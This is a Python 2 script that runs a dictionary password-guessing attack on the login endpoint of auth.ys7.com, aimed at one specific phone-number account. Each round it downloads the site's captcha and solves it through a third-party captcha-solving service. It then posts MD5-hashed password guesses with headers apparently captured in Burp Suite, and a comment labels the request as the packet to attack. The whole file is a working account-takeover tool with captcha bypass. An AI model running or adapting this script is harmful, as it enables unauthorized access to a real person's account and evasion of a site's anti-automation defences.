#!/usr/bin/env python
# encoding:utf8

import sys
import hashlib
import os
import random
import urllib, urllib2
import requests
import re
from datetime import *

dict_file = 'E:\Tools\Scripts\PySec\\3'

def request_capt():
    captcha_url = "https://auth.ys7.com/captcha?random=0.8554329861193724&indexcode=15001022895"
    r = requests.get(captcha_url)
    with open('test1111.jpg', 'wb') as f:
        f.writelines(r.content)
    return 'test1111.jpg'

def md5(sstr):
    m = hashlib.md5()
    m.update(sstr)
    return m.hexdigest()

def base64(sstr):
    import base64
    return base64.b64encode(sstr)

def mydict():
    dict_list = []
    with open(dict_file, 'r') as f:
        for line in f.readlines():
            dict_list.append(line.rstrip())
    return dict_list


class APIClient(object):
    def http_request(self, url, paramDict):
        post_content = ''
        for key in paramDict:
            post_content = post_content + '%s=%s&'%(key,paramDict[key])
        post_content = post_content[0:-1]
    
        req = urllib2.Request(url, data=post_content)
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())  
        response = opener.open(req, post_content)  
        return response.read()

    def http_upload_image(self, url, paramKeys, paramDict, filebytes):
        timestr = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        boundary = '------------' + hashlib.md5(timestr).hexdigest().lower()
        boundarystr = '\r\n--%s\r\n'%(boundary)
        
        bs = b''
        for key in paramKeys:
            bs = bs + boundarystr.encode('ascii')
            param = "Content-Disposition: form-data; name=\"%s\"\r\n\r\n%s"%(key, paramDict[key])
     
            bs = bs + param.encode('utf8')
        bs = bs + boundarystr.encode('ascii')
        
        header = 'Content-Disposition: form-data; name=\"image\"; filename=\"%s\"\r\nContent-Type: image/gif\r\n\r\n'%('sample')
        bs = bs + header.encode('utf8')
        
        bs = bs + filebytes
        tailer = '\r\n--%s--\r\n'%(boundary)
        bs = bs + tailer.encode('ascii')
        
        headers = {'Content-Type':'multipart/form-data; boundary=%s'%boundary,
                   'Connection':'Keep-Alive',
                   'Expect':'100-continue',
                   }
        response = requests.post(url, params='', data=bs, headers=headers)

        rer = re.compile(r'Result>(.*?)</Result')
        return rer.findall(response.text)[0]

    
if __name__ == '__main__':

    client = APIClient()
    
    for mima in mydict():
        paramDict = {}
        result = ''
        
        paramDict['username'] = 'username'
        paramDict['password'] = 'password'
        paramDict['typeid'] = 3040
        paramDict['timeout'] = 90
        paramDict['softid'] = 1
        paramDict['softkey'] = 'b40ffbee5c1cf4e38028c197eb2fc751'
        paramKeys = ['username',
                    'password',
                    'typeid',
                    'timeout',
                    'softid',
                    'softkey'
                ]

        from PIL import  Image
        imagePath = request_capt()
        img = Image.open(imagePath)
        if img is None:
            print 'get file error!'
            continue
        img.save("upload.gif", format="gif")
        filebytes = open("upload.gif", "rb").read()
        capt_result = client.http_upload_image("http://api.ysdm.net/create.xml", paramKeys, paramDict, filebytes) 
        #print capt_result


        # 要攻击的包
        burp0_url = "https://auth.ys7.com:443/doLogin"
        burp0_headers = {"Connection": "close", "Accept": "application/json, text/javascript, */*; q=0.01", "Origin": "https://auth.ys7.com", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "https://auth.ys7.com/signIn?from=509cb5ddedd147e486fb&r=6623714311&returnUrl=https%3A%2F%2Fwww.ys7.com%2F%3FloginRedirect%3D1&host=www.ys7.com%2Flogin%2F", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
        burp0_data={"account": "15001022895", "password": "{0}".format(md5(mima)), "invAcct": '', "invPwd": '', "sign": '', "cname": '', "captcha": "{0}".format(capt_result), "from": "509cb5ddedd147e486fb", "r": "6623714311", "returnUrl": "https://www.ys7.com/?loginRedirect=1"}

        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        
        print "captcha: " + capt_result + "\tpass: " + mima
        print r.content
        print '\n'